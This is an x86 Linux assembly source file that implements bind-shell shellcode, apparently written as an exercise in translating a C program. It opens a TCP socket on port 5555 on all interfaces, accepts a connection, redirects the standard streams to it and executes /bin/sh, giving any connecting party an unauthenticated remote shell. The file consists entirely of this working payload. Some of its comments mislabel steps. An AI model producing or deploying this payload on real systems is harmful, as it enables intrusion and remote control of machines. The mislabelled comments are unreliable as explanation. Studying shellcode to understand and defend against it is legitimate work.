; Filename: shellcode_bind_tcp.asm
; Purpose: Translate shell_bind_tcp.c in assembly

; Reference

; from /usr/include/linux/net.h:
; SYS_SOCKET  1       
; SYS_BIND    2      
; SYS_LISTEN  4    
; SYS_ACCEPT  5

; from /usr/include/netinet/in.h
; #define INADDR_ANY              ((in_addr_t) 0x00000000)

; from /usr/include/i386-linux-gnu/bits/socket.h
; #define PF_INET         2       /* IP protocol family.  */
; #define AF_INET         PF_INET
; #define SOCK_SIZE__     16    /* sizeof(struct sockaddr) */


global _start

section .text

_start:

    ; CREATE A SOCKET - int socket(int domain, int type, int protocol);

    ; EAX = 0x66 (socketcall), EBX = 0x1 (socket())
    ; ECX = ESP(0x2 (AF_INET), 0x1 (SOCKSTREAM), 0x0)

    xor ebx, ebx    ; zero EBX for socket()
    xor eax, eax    ; zero EAX argument 3
    push eax        ; push EAX (0x00000000) on stack for protocol 
    mov al, 0x66    ; syscall = socketcall()
    inc ebx         ; set EBX to 0x1 for SOCKSTREAM
    push ebx        ; push EBX for SOCKSTREAM 
    push byte 0x2   ; push 0x2 for AF_INET
    mov ecx, esp    ; mov args into ECX
    int 0x80        ; invoke socket()

    ; EAX receieves the return value socket() (sockfd in C program)

    xchg edi, eax   ; Save the returned socket (sockfd) to EDI    
    

    ; BIND SOCKET TO A LOCAL PORT - int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; EAX = 0x66 (socketcall), EBX = 0x2 (bind())
    ; ECX = ESP(socket, server struct , 0x10)

    ; memset(&server, 0 sizeof(server));                                      
    ; server.sin_family = AF_INET;
    ; server.sin_port = htons(PORT);
    ; server.sin_addr.s_addr = INADDR_ANY;

    xor esi, esi    ; zero ESI (0x00000000)
    push esi        ; push ESI (0x00000000) for INADDR_ANY
    push word 0xb315; push 0xb315 (5555) for PORT (listening port in little-endian)
    inc ebx         ; set EBX to 0x2 for AF_INET 
    push bx         ; push BX (0x0002) for AF_INET 
    mov ecx, esp    
    
    ; bind() arguments
    
    xor eax, eax    ; zero EAX 
    mov al, 0x66    ; syscall = socketcall
                    ; EBX is already 0x2
    push dword 0x10 ; push 0x10 for argument 3: socklen_t addrlen
    push ecx        ; push ECX for argument 2: pointer to struct sockaddr
    push edi        ; push EDI for argument 1: sockfd
    mov ecx, esp    ; save pointer to args in ECX
    int 0x80        ; invoke bind() syscall


    ; LISTEN ON LOCAL PORT - int listen(int sockfd, int backlog);
    ; EAX = 0x66 (socketcall), EBX = 0x4 (listen)
    ; ECX = (socket, 0xa)

    mov al, 0x66    ; syscall = socketcall
    xor ebx, ebx    ; zero EBX
    mov bl, 0xa     ; move 0xa into EBX
    push ebx        ; backlog = 0xa
    mov bl, 0x4     ; listen() = 0x4
    push edi        ; argument 1: sockfd   
    mov ecx, esp    ; save pointer to args in ECX
    int 0x80        ; invoke bind()


    ; ACCEPT - int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    ; EAX = 0x66, EBX = 0x5 (accept)
    ; ECX = (socket, server struct, 0x0, 0x0)

    mov al, 0x66    ; syscall = socketcall
    xor ebx, ebx    ; zero EBX
    mov bl, 0x5     ; accept() = 0x5
    push esi        ; ESI is (0x00000000)
    push esi        ; ESI is (0x00000000)
    push edi        ; argument 1: sockfd
    mov ecx, esp    ; save pointer to args in ECX
    int 0x80        ; invoke accept() syscall

    xchg ebx, eax   ; EAX (newsock) <=> EBX
    

    ; DUPLICATE FILE DESCRIPTOR - int dup2(int oldfd, int newfd);
    ; EAX = 0x3f (dup2), EBX = old file descriptor (sockfd)
    ; ECX = new file descriptor (0 = STDIN / 1 = STDOUT / 2 = STDERR)

    xor ecx, ecx    ; zero ECX
    mov cl, 0x2     ; move file descriptor STDERR in CL

loop_dup2:

    xor eax, eax
    mov al, 0x3f    ; syscall = dup2
    int 0x80        ; invoke dup2 syscall

    dec ecx         ; increment new file descriptor so that it reaches values 1 (stdout) and 2 (stderr)
    jns loop_dup2   ; jump on no sign (SF flag) to execve


    ; EXECVE SYSCALL - int execve(const char *filename, char *const argv[], char *const envp[]);
    ; EAX = 0xb, EBX = "//bin/sh"
    ; ECX = ESP("//bin/sh", 0), EDX = NULL

    push eax        ; push EAX (0x00000000) for *const envp[]
    push 0x68732f6e ; push "sh/n"
    push 0x69622f2f ; push "ib//"

    mov ebx, esp    ; argument 1: const char *filename
    push eax        ; EAX is already NULL
    mov edx, esp    ; argument 3: char *const envp[]
    push ebx        ; push EBX on stack for argument 2
    mov ecx, esp    ; argument 2: char *const argv[] 
    mov al, 11      ; syscall = execve()
    int 0x80        ; invoke execve()
